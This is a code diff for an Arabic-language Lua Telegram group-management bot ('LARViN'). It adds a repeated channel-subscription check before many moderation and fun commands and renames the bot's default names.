+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:List:Filter"..msg.chat_id_)  
 t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do  
@@ -3499,6 +4332,15 @@ return false  end
 end
 
 if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Addictive(msg) then    
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
 database:set(bot_id.."LARViN:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
@@ -3513,6 +4355,15 @@ return false  end
 end
 
 if text == "مسح البوتات" and Addictive(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
 local admins = tah.members_  
 local x = 0
@@ -3535,6 +4386,15 @@ end
 end,nil)  
 end   
 if text == ("كشف البوتات") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
 local admins = result.members_  
 text = "\n⛔┇قائمة البوتات الموجوده \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
@@ -3577,18 +4437,45 @@ database:del(bot_id.."LARViN:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_us
 end  
 
 if text == "ضع قوانين" or text == "وضع قوانين" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 database:setex(bot_id.."LARViN:Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_,msg.id_,"🔖┇ارسل لي القوانين الان")  
 end
 end
 if text == "مسح القوانين" or text == "حذف القوانين" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 send(msg.chat_id_, msg.id_,"🔖┇تم ازالة قوانين المجموعه")  
 database:del(bot_id.."LARViN:Set:Rules:Group"..msg.chat_id_) 
 end
 end
 if text == "القوانين" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local Set_Rules = database:get(bot_id.."LARViN:Set:Rules:Group" .. msg.chat_id_)   
 if Set_Rules then     
 send(msg.chat_id_,msg.id_, Set_Rules)   
@@ -3598,6 +4485,15 @@ end
 end
 
 if text == "الاوامر المضافه" and Constructor(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:List:Cmd:Group:New"..msg.chat_id_.."")
 t = "🔰┇قائمه الاوامر المضافه  \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -3614,6 +4510,15 @@ end
 send(msg.chat_id_, msg.id_,"["..t.."]")
 end
 if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then 
 local list = database:smembers(bot_id.."LARViN:List:Cmd:Group:New"..msg.chat_id_)
 for k,v in pairs(list) do
@@ -3624,11 +4529,29 @@ send(msg.chat_id_, msg.id_,"🔰┇تم مسح جميع الاوامر التي 
 end
 end
 if text == "اضف امر" and Constructor(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 send(msg.chat_id_, msg.id_,"🔰┇الان ارسل لي الامر القديم ..")  
 return false
 end
 if text == "حذف امر" or text == "مسح امر" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then
 database:set(bot_id.."LARViN:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 send(msg.chat_id_, msg.id_,"🔰┇ارسل الامر الذي قم بوضعه بدلا عن القديم")  
@@ -3637,6 +4560,15 @@ end
 end
 
 if text == "الصلاحيات" and Addictive(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Coomds"..msg.chat_id_)
 if #list == 0 then
 send(msg.chat_id_, msg.id_,"🔖┇لا توجد صلاحيات مضافه")
@@ -3662,6 +4594,15 @@ end
 send(msg.chat_id_, msg.id_,"🔘┇تم مسح الصلاحيات")
 end
 if text and text:match("^اضف صلاحيه (.*)$") and Addictive(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 ComdNew = text:match("^اضف صلاحيه (.*)$")
 database:set(bot_id.."LARViN:Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
 database:sadd(bot_id.."LARViN:Coomds"..msg.chat_id_,ComdNew)  
@@ -3669,6 +4610,15 @@ database:setex(bot_id.."LARViN:Comd:New"..msg.chat_id_..""..msg.sender_user_id_,
 send(msg.chat_id_, msg.id_, "🎖┇ارسل نوع الصلاحيه ⚜️\n📊┇(عضو ~ مميز  ~ ادمن  ~ مدير )") 
 end
 if text and text:match("^مسح صلاحيه (.*)$") and Addictive(msg) or text and text:match("^حذف صلاحيه (.*)$") and Addictive(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
 database:del(bot_id.."LARViN:Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "☑┇تم مسح الصلاحيه ") 
@@ -3743,7 +4693,7 @@ send(msg.chat_id_, msg.id_,"🔖┇ تم تغير رد العضو الى » "..T
 end
 
 
-if text == ("مسح ردود المدير") and Owner(msg) then
+if text == ("مسح ردود المدير") and BasicConstructor(msg) then
 local list = database:smembers(bot_id.."LARViN:List:Manager"..msg.chat_id_.."")
 for k,v in pairs(list) do
 database:del(bot_id.."LARViN:Add:Rd:Manager:Gif"..v..msg.chat_id_)   
@@ -3835,11 +4785,29 @@ return false
 end  
 end
 if text == "اضف رد" and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 send(msg.chat_id_, msg.id_,"📫┇ارسل الكلمه التري تريد اضافتها")
 database:set(bot_id.."LARViN:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return false 
 end
 if text == "حذف رد" and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 send(msg.chat_id_, msg.id_,"📫┇ارسل الكلمه التري تريد حذفها")
 database:set(bot_id.."LARViN:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
 return false 
@@ -4114,6 +5082,15 @@ end
 end
 end
 if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then    
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
 for k, v in pairs(del.members_) do
@@ -4141,11 +5118,21 @@ database:del(bot_id.."LARViN:Reply:Sudo"..msg.chat_id_)
 send(msg.chat_id_, msg.id_,"📛┇تم تفعيل ردود المطور" ) 
 end
 if text == "تعطيل ردود المطور" and Owner(msg) then  
+
 database:set(bot_id.."LARViN:Reply:Sudo"..msg.chat_id_,true)   
 send(msg.chat_id_, msg.id_,"📛┇تم تعطيل ردود المطور" ) 
 end
 
 if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if tonumber(SUDO) == tonumber(result.sender_user_id_) then
 send(msg.chat_id_, msg.id_,"💢┇ لا تستطيع تنزيل المطور الاساسي")
@@ -4199,6 +5186,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 end
 if text == "تاك للكل" and Addictive(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""), offset_ = 0,limit_ = 200},function(ta,taha)
 local t = "\n⛔┇ قائمة الاعضاء \n━━━━━━━━━━━━━\n"
 x = 0
@@ -4216,10 +5212,28 @@ end,nil)
 end
 
 if text == "رتبتي" then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local rtp = Get_Rank(msg.sender_user_id_,msg.chat_id_)
 send(msg.chat_id_, msg.id_,"💢┇ رتبتك في البوت » "..rtp)
 end
 if text == "اسمي"  then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
 if result.first_name_  then
 first_name = "🚫┇ اسمك الاول ← {`"..(result.first_name_).."`}"
@@ -4235,6 +5249,15 @@ send(msg.chat_id_, msg.id_,first_name.."\n"..last_name)
 end,nil)
 end 
 if text==("عدد الكروب") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_,msg.id_,"💢┇ البوت ليس ادمن هنا \n") 
 return false  
@@ -4251,6 +5274,15 @@ end,nil)
 end,nil)
 end 
 if text == "اطردني" or text == "طردني" then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if not database:get(bot_id.."LARViN:Kick:Me"..msg.chat_id_) then
 if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, "\n💢┇ عذرا لا استطيع طرد ( "..Get_Rank(msg.sender_user_id_,msg.chat_id_).." )")
@@ -4281,16 +5313,43 @@ end
 end
 
 if text == "تفعيل اطردني" and Owner(msg) then   
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Kick:Me"..msg.chat_id_)  
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == "تعطيل اطردني" and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Kick:Me"..msg.chat_id_,true)  
 Text = "\n📫┇تم تعطيل امر اطردني"
 send(msg.chat_id_, msg.id_,Text) 
 end
 
 if text and text:match("^رفع القيود @(.*)") and Owner(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^رفع القيود @(.*)") 
 function Function_LARViN(extra, result, success)
 if result.id_ then
@@ -4315,6 +5374,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 end
 if text == "رفع القيود" and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if DevLARViN(msg) then
 database:srem(bot_id.."LARViN:GBan:User",result.sender_user_id_)
@@ -4334,6 +5402,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 end
 if text and text:match("^كشف القيود @(.*)") and Owner(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^كشف القيود @(.*)") 
 function Function_LARViN(extra, result, success)
 if result.id_ then
@@ -4361,6 +5438,15 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 end
 
 if text == "كشف القيود" and Owner(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if database:sismember(bot_id.."LARViN:Muted:User"..msg.chat_id_,result.sender_user_id_) then
 Muted = "مكتوم"
@@ -4384,6 +5470,15 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 end
 
 if text and text:match("^ضع اسم (.*)") and Owner(msg) or text and text:match("^وضع اسم (.*)") and Owner(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local Name = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
 tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
 if data.message_ == "Channel chat title can be changed by administrators only" then
@@ -4399,6 +5494,15 @@ end,nil)
 end
 
 if text ==("رفع الادمنيه") and Owner(msg) then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local num2 = 0
 local admins = data.members_
@@ -4435,7 +5539,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"🔘┇ حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "Source_Milano")
+local UserName = (b.username_ or "LARViNTEAM")
 send(msg.chat_id_, msg.id_,"🚸┇منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
@@ -4455,7 +5559,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"📬┇حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "Source_Milano")
+local UserName = (b.username_ or "LARViNTEAM")
 send(msg.chat_id_, msg.id_,"🚸┇تم ترقية منشئ المجموعه ~ ["..b.first_name_.."](T.me/"..UserName..")")  
 database:sadd(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_,b.id_)
 end,nil)   
@@ -4490,8 +5594,17 @@ database:set(bot_id.."LARViN:Left:Bot"..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_, "📫┇تم تعطيل مغادرة البوت") 
 return false 
 end
-if text == (database:get(bot_id.."LARViN:Name:Bot") or "تشاكي") then
-Namebot = (database:get(bot_id.."LARViN:Name:Bot") or "تشاكي")
+if text == (database:get(bot_id.."LARViN:Name:Bot") or "لارفين") then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
+Namebot = (database:get(bot_id.."LARViN:Name:Bot") or "لارفين")
 local namebot = {
 "عمري فداك "..Namebot.. " كول حب ",
 "كول حبيبي ؟ اني "..Namebot,
@@ -4510,7 +5623,7 @@ return false
 end
 
 if text == "بوت" then
-Namebot = (database:get(bot_id.."LARViN:Name:Bot") or "تشاكي")
+Namebot = (database:get(bot_id.."LARViN:Name:Bot") or "لارفين")
 send(msg.chat_id_, msg.id_,"اسمي القميل ["..Namebot.."] ") 
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
@@ -4922,31 +6035,94 @@ local text =
 send(msg.chat_id_, msg.id_,text)     
 end    
 if text == "تعطيل اوامر التحشيش" and Owner(msg) then    
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 send(msg.chat_id_, msg.id_, '☑┇تم تعطيل اوامر التحشيش')
 database:set(bot_id.."LARViN:Fun_Bots"..msg.chat_id_,"true")
 end
 if text == "تفعيل اوامر التحشيش" and Owner(msg) then    
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 send(msg.chat_id_, msg.id_,'☑┇تم تفعيل اوامر التحشيش')
 database:del(bot_id.."LARViN:Fun_Bots"..msg.chat_id_)
 end
 
-if text == 'تفعيل الايدي' and Owner(msg) then   
+if text == 'تفعيل الايدي' and Owner(msg) then 
+  if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id..'LARViN:Lock:ID:Bot'..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,'☑┇تم تفعيل الايدي') 
 end
 if text == 'تعطيل الايدي' and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id..'LARViN:Lock:ID:Bot'..msg.chat_id_,true) 
 send(msg.chat_id_, msg.id_,'☑┇تم تعطيل الايدي') 
 end
 if text == 'تفعيل الايدي بالصوره' and Owner(msg) then   
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id..'LARViN:Lock:ID:Bot:Photo'..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,'☑┇تم تفعيل الايدي بالصوره') 
 end
 if text == 'تعطيل الايدي بالصوره' and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id..'LARViN:Lock:ID:Bot:Photo'..msg.chat_id_,true) 
